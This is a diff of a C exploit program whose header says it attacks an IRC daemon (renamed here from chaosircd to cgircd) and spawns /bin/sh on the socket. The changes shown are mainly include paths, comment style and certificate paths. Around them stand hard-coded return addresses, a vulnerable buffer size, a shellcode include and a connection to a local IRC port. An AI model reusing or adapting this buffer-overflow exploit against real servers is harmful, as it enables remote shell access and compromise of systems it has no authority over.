@@ -1,23 +1,23 @@
 /* -------------------------------------------------------------------------- *
- * This exploits chaosircd and spawns /bin/sh on the socket                   *
+ * This exploits cgircd and spawns /bin/sh on the socket                   *
  * -------------------------------------------------------------------------- */
 
-#include <libchaos/config.h>
-#include <libchaos/io.h>
-#include <libchaos/log.h>
-#include <libchaos/mem.h>
-#include <libchaos/str.h>
-#include <libchaos/ssl.h>
-#include <libchaos/timer.h>
-#include <libchaos/dlink.h>
-#include <libchaos/connect.h>
+#include "ircd/config.h"
+#include "libchaos/io.h"
+#include "libchaos/log.h"
+#include "libchaos/mem.h"
+#include "libchaos/str.h"
+#include "libchaos/ssl.h"
+#include "libchaos/timer.h"
+#include "libchaos/dlink.h"
+#include "libchaos/connect.h"
 
-#include <chaosircd/config.h>
+#include "ircd/config.h"
 
-//#define RETADDR 0x4003f6d0
-//#define RETADDR 0x08099145
+/*#define RETADDR 0x4003f6d0*/
+/*#define RETADDR 0x08099145*/
 #define RETADDR 0x402de804
-//#define RETADDR 0xbffff620
+/*#define RETADDR 0xbffff620*/
 #define VULNSIZE 0x100
 
 #include <shellcode.h>
@@ -220,7 +220,7 @@ void sploit_run(void)
   sploit_proto = net_register(NET_CLIENT, "sploit", sploit_handler);
   
   ssl_add("connect", SSL_CONTEXT_CLIENT,
-          "/etc/chaosircd/ircd.crt", "/etc/chaosircd/ircd.key",
+          "/etc/ircd/ircd.crt", "/etc/ircd/ircd.key",
           "RSA+HIGH:RSA+MEDIUM:@STRENGTH");
   
   sploit_connect = connect_add("127.0.0.1", 6667, sploit_proto, 
@@ -247,7 +247,7 @@ void sploit_loop(void)
     ret = io_select(&remain, timeout);
 #elif (defined USE_POLL)
     ret = io_poll(&remain, timeout);
-#endif /* USE_SELECT | USE_POLL */
+#endif
     
     /* Remaining time is 0msecs, we need to run a timer */
     if(remain == 0LL)
